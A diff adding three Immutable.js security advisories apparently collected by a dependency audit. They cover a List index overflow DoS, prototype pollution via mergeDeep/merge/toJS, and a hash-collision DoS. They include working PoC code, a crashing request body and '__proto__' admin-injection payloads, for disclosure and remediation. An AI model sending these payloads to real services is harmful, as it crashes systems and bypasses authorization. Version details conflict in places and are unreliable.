@@ -1,0 +1,261 @@
+===== GHSA-v56q-mh7h-f735 | high | cvss 7.5 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H | CVE-2026-59879
+TITLE: Immutable.js `List` 32-bit trie overflow → unrecoverable DoS
+RANGES: >=4.0.0-rc.1 <4.3.9 (installed 4.1.0)
+PATCHED: >=4.3.9
+
+## Summary
+
+`List#set`, `List#setSize`, `List#setIn`, `List#updateIn` (and the functional `set` / `setIn` / `updateIn`) mishandle an index or size in the range `[2 ** 30, 2 ** 31)`:
+
+- On an **empty** `List` the operation enters an **uncatchable infinite loop** (a tight CPU spin; a surrounding `try/catch` never regains control). Only killing the worker recovers it.
+- On a **populated** `List` (≥ 32 elements — i.e. any array of ≥ 32 items turned into a `List` by `fromJS`) the loop allocates without bound → heap exhaustion → the **process aborts** (`SIGABRT`, exit `134`, or kernel OOM-kill `137`). A real crash, not a recoverable error.
+
+The index may be a **numeric string**, so it can come straight from a request body, URL, or key-path. A single small unauthenticated request is enough.
+
+There is also a companion **silent data-corruption** issue in `setSize`:
+
+```js
+List([1, 2, 3]).setSize(2 ** 31); // before fix => size 0  (silently cleared)
+List([1, 2, 3]).setSize(2 ** 32 + 5); // before fix => size 5  (huge value wraps to 5)
+```
+
+## Impact
+
+Availability only. A reachable configuration is any endpoint that routes untrusted input into a `List` index or a `setIn`/`updateIn` key-path — which the extremely common `state = fromJS(body); state.setIn(userPath, value)` pattern does (config stores, document/collection editors, redux-immutable reducers, JSON-Patch endpoints, etc.).
+
+No confidentiality or integrity impact, no RCE. The companion `setSize` bug can silently corrupt application state (wrong size) without crashing.
+
+## Reproduction (immutable 5.1.7)
+
+```ts
+import { fromJS, List } from 'immutable';
+
+// 1) Populated List: OOM -> process abort (SIGABRT, exit 134) within ~2s
+fromJS({ items: new Array(64).fill(0) }).setIn(['items', '1073741824'], 'x');
+
+// 2) Empty List: hangs forever, uncatchable
+List().set(2 ** 30, 'x');
+
+// 3) Silent truncation
+List([1, 2, 3]).setSize(2 ** 31); // => size 0
+List([1, 2, 3]).setSize(2 ** 32 + 5); // => size 5
+```
+
+A remote 43-byte HTTP request (`{"path":["items","1073741824"],"value":"x"}`) is sufficient to abort a worker that applies it via `state = state.setIn(path, value)`.
+
+Any index in `[2 ** 30, 2 ** 31)` works (`1073741824`, `2000000000`, …). An index in `[2 ** 31, 2 ** 32)` does not crash — it silently wraps (clearing the List) via the same root cause.
+
+## Root cause
+
+`List` stores its values in a 32-wide trie (`SHIFT = 5`, so each level addresses 5 more bits) and uses **signed 32-bit bitwise arithmetic** throughout `setListBounds()` (`src/List.js`):
+
+1. **Infinite loop (the hang / OOM).** The level-raising loop
+
+```js
+while (newTailOffset >= 1 << (newLevel + SHIFT)) {
+  newRoot = new VNode(
+    newRoot && newRoot.array.length ? [newRoot] : [],
+    owner
+  );
+  newLevel += SHIFT;
+}
+```
+
+relies on `1 << (newLevel + SHIFT)`. A JavaScript shift count is taken **mod 32**, so once `newLevel + SHIFT` reaches `31` the term goes **negative** (`1 << 31 === -2147483648`) and at `32` wraps to `1` (`1 << 35 === 8`). The comparison then stays `true` forever and the loop never terminates. On a populated `List`, each iteration retains a new `VNode` (`[newRoot]`), so the heap fills and V8 aborts; on an empty `List` it spins on CPU without allocating.
+
+2. **Silent wraparound (the `setSize` corruption).** The `begin |= 0` / `end |= 0` coercion (`ToInt32`) silently wraps large finite values (`(2 ** 31) | 0 === -2147483648`, `(2 ** 32 + 5) | 0 === 5`), producing a wrong resulting size instead of an error.
+
+The threshold is `2 ** 30`: that is the largest size for which `1 << (newLevel + SHIFT)` stays a valid positive 32-bit integer throughout the loops (`newLevel + SHIFT` stays ≤ 30).
+
+## Remediation
+
+The fix is contained to `setListBounds()` in `src/List.js`:
+
+1. **Validate up front, before the lossy `| 0` coercion.** Compute the intended origin and capacity in full precision and throw a clear, catchable `RangeError` when they exceed the addressable range (`MAX_LIST_SIZE = 2 ** 30`). `Infinity`/`NaN` are left to the existing `| 0 → 0` behaviour (so `setSize(Infinity)` stays `0` and `slice(0, Infinity)` still means "to the end").
+
+2. **Stop the shift from wrapping.** Replace `1 << exp` in the level-raising loops with a helper that uses the cheap bitwise shift while it is exact (`exp ≤ 30`, the common path including every `push`/`setSize`/`slice`) and falls back to the non-wrapping `2 ** exp` only for the rare deep trees reached when a negative origin (`unshift` / negative index) is normalized to a large positive capacity (`exp` can reach 35 there, where `1 << 35` would wrap to 8).
+
+This turns every hang, the misleading `"Maximum call stack size exceeded"`, the OOM/`SIGABRT`, and the silent `setSize` truncation into one descriptive `RangeError`, preserves all behaviour for sizes `< 2 ** 30`, and keeps the hot `push` path on the fast bitwise shift (the `2 ** exp` branch is never reached by non-negative operations).
+
+### Is the new limit a breaking change?
+
+No working code is affected. A `List` could never actually hold `≥ 2 ** 30` values before — the attempt hung, crashed, or silently corrupted the size. The limit was already implicit in the 32-bit trie; the fix only makes it explicit and catchable, mirroring native JS arrays (`new Array(2 ** 32)` → `RangeError: Invalid array length`). The single observable behaviour change is that `setSize(hugeValue)`, which used to return a silently wrong size, now throws. `2 ** 30` ≈ 1.07 billion entries (~8 GB of pointers alone), far beyond any practical use.
+
+## Mitigations (for users who cannot upgrade immediately)
+
+- Validate/clamp any externally supplied `List` index or `setIn`/`updateIn` key-path segment against a sane maximum before passing it to immutable.
+- Reject numeric path segments `≥ 2 ** 30`.
+- Run request handling in a worker that can be restarted, and cap the heap (`--max-old-space-size`) so an abort is contained.
+
+===== GHSA-wf6x-7x77-mvgw | high | cvss 9.8 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | CVE-2026-29063
+TITLE: Immutable is vulnerable to Prototype Pollution
+RANGES: >=4.0.0-rc.1 <4.3.8 (installed 4.1.0)
+PATCHED: >=4.3.8
+
+## Impact
+_What kind of vulnerability is it? Who is impacted?_
+
+A Prototype Pollution is possible in immutable via the mergeDeep(), mergeDeepWith(), merge(), Map.toJS(), and Map.toObject() APIs.
+
+## Affected APIs
+
+| API                                     | Notes                                                       |
+| --------------------------------------- | ----------------------------------------------------------- |
+| `mergeDeep(target, source)`              | Iterates source keys via `ObjectSeq`, assigns `merged[key]` |
+| `mergeDeepWith(merger, target, source)`  | Same code path                                              |
+| `merge(target, source)`                    | Shallow variant, same assignment logic                      |
+| `Map.toJS()`                              | `object[k] = v` in `toObject()` with no `__proto__` guard   |
+| `Map.toObject()`                            | Same `toObject()` implementation                            |
+| `Map.mergeDeep(source)`                  | When source is converted to plain object                    |
+
+
+
+## Patches
+_Has the problem been patched? What versions should users upgrade to?_
+
+| major version | patched version |
+| --- | --- |
+| 3.x | 3.8.3 |
+| 4.x | 4.3.7 |
+| 5.x | 5.1.5 |
+
+## Workarounds
+_Is there a way for users to fix or remediate the vulnerability without upgrading?_
+
+- [Validate user input](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution#validate_user_input)
+- [Node.js flag --disable-proto](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution#node.js_flag_--disable-proto)
+- [Lock down built-in objects](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution#lock_down_built-in_objects)
+- [Avoid lookups on the prototype](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution#avoid_lookups_on_the_prototype)
+- [Create JavaScript objects with null prototype](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution#create_javascript_objects_with_null_prototype)
+
+## Proof of Concept
+
+### PoC 1 — mergeDeep privilege escalation
+
+```javascript
+"use strict";
+const { mergeDeep } = require("immutable"); // v5.1.4
+
+// Simulates: app merges HTTP request body (JSON) into user profile
+const userProfile = { id: 1, name: "Alice", role: "user" };
+const requestBody = JSON.parse(
+  '{"name":"Eve","__proto__":{"role":"admin","admin":true}}',
+);
+
+const merged = mergeDeep(userProfile, requestBody);
+
+console.log("merged.name:", merged.name); // Eve   (updated correctly)
+console.log("merged.role:", merged.role); // user  (own property wins)
+console.log("merged.admin:", merged.admin); // true  ← INJECTED via __proto__!
+
+// Common security checks — both bypassed:
+const isAdminByFlag = (u) => u.admin === true;
+const isAdminByRole = (u) => u.role === "admin";
+console.log("isAdminByFlag:", isAdminByFlag(merged)); // true  ← BYPASSED!
+console.log("isAdminByRole:", isAdminByRole(merged)); // false (own role=user wins)
+
+// Stealthy: Object.keys() hides 'admin'
+console.log("Object.keys:", Object.keys(merged)); // ['id', 'name', 'role']
+// But property lookup reveals it:
+console.log("merged.admin:", merged.admin); // true
+```
+
+### PoC 2 — All affected APIs
+
+```javascript
+"use strict";
+const { mergeDeep, mergeDeepWith, merge, Map } = require("immutable");
+
+const payload = JSON.parse('{"__proto__":{"admin":true,"role":"superadmin"}}');
+
+// 1. mergeDeep
+const r1 = mergeDeep({ user: "alice" }, payload);
+console.log("mergeDeep admin:", r1.admin); // true
+
+// 2. mergeDeepWith
+const r2 = mergeDeepWith((a, b) => b, { user: "alice" }, payload);
+console.log("mergeDeepWith admin:", r2.admin); // true
+
+// 3. merge
+const r3 = merge({ user: "alice" }, payload);
+console.log("merge admin:", r3.admin); // true
+
+// 4. Map.toJS() with __proto__ key
+const m = Map({ user: "alice" }).set("__proto__", { admin: true });
+const r4 = m.toJS();
+console.log("toJS admin:", r4.admin); // true
+
+// 5. Map.toObject() with __proto__ key
+const m2 = Map({ user: "alice" }).set("__proto__", { admin: true });
+const r5 = m2.toObject();
+console.log("toObject admin:", r5.admin); // true
+
+// 6. Nested path
+const nested = JSON.parse('{"profile":{"__proto__":{"admin":true}}}');
+const r6 = mergeDeep({ profile: { bio: "Hello" } }, nested);
+console.log("nested admin:", r6.profile.admin); // true
+
+// 7. Confirm NOT global
+console.log("({}).admin:", {}.admin); // undefined (global safe)
+```
+
+**Verified output against immutable@5.1.4:**
+
+```
+mergeDeep admin: true
+mergeDeepWith admin: true
+merge admin: true
+toJS admin: true
+toObject admin: true
+nested admin: true
+({}).admin: undefined  ← global Object.prototype NOT polluted
+```
+
+
+## References
+_Are there any links users can visit to find out more?_
+
+- [JavaScript prototype pollution](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution)
+
+===== GHSA-xvcm-6775-5m9r | high | cvss 0  | CVE-2026-59880
+TITLE: Immutable: Hash-collision algorithmic complexity denial of service in Immutable.Map/Set
+RANGES: >=4.0.0-beta.1 <4.3.9 (installed 4.1.0)
+PATCHED: >=4.3.9
+
+## Summary
+
+`Immutable.Map` and `Immutable.Set` keep keys that share the same 32-bit hash in a collision bucket that is scanned linearly. The string hash is public and deterministic, so an attacker who controls the **keys** inserted into a Map can craft many keys that all collide, degrading insertion and lookup from amortized O(1) to O(n) per operation — and O(n²) to build or read the whole set. A small, attacker-shaped payload can therefore consume disproportionate CPU and, on a single-threaded runtime such as Node.js, stall the event loop and deny service.
+
+## Details
+
+The string hash uses the JVM-style polynomial `hashed = (31 * hashed + charCode) | 0`. Strings such as `"Aa"` and `"BB"` hash to the same value (`65*31+97 == 66*31+66 == 2112`), and concatenating such blocks yields `2^n` distinct strings sharing one hash (40 characters ⇒ >1,000,000 colliding keys). 
+All such keys route to a single `HashCollisionNode`, whose `get`/`update` walk the entire bucket testing `is()`. There is no per-process salt, so the colliding set is fully precomputable from the open-source algorithm.
+
+## Proof of concept
+
+Inserting N colliding keys (e.g. via `Immutable.Map(obj)` / `Immutable.fromJS(obj)`) is O(N²). Measured on one machine, ~8,000 colliding
+keys take ~0.7 s to build and ~0.6 s to read, scaling ×4 per doubling; ~16,000 keys exceed several seconds.
+
+## Impact
+
+CPU-bound denial of service in applications that ingest attacker-controlled object **keys** into Immutable structures, e.g. `Immutable.Map(req.body)`, `Immutable.fromJS(req.body)`, `state.merge(userObject)` / `mergeDeep(...)`. Applications that only store attacker input as **values** under fixed keys are not affected.
+
+## Affected versions
+
+- >= 4.0.0-beta.1, < 4.3.9
+- >= 5.0.0-beta.1, < 5.1.8
+- < 3.8.4
+
+## Patches
+
+Fixed in `5.1.8` _(adjust to the actual release)_: large collision buckets are indexed by a per-process **seeded** secondary hash, restoring near-linear behavior for the affected paths. The public `hash()` is unchanged (no breaking change), and `is()` remains the sole authority on key equality. Also fixed in 4.3.9 and 3.8.4.
+
+## Workarounds
+
+Before passing untrusted data to Immutable.js: cap request body size, limit object key count/length, and reject high-cardinality payloads; avoid building Maps directly from untrusted object keys.
+
+## References
+
+- CWE-407 (Inefficient Algorithmic Complexity), CWE-400 (Uncontrolled Resource Consumption)
+- OWASP API4:2023 (Unrestricted Resource Consumption)
+
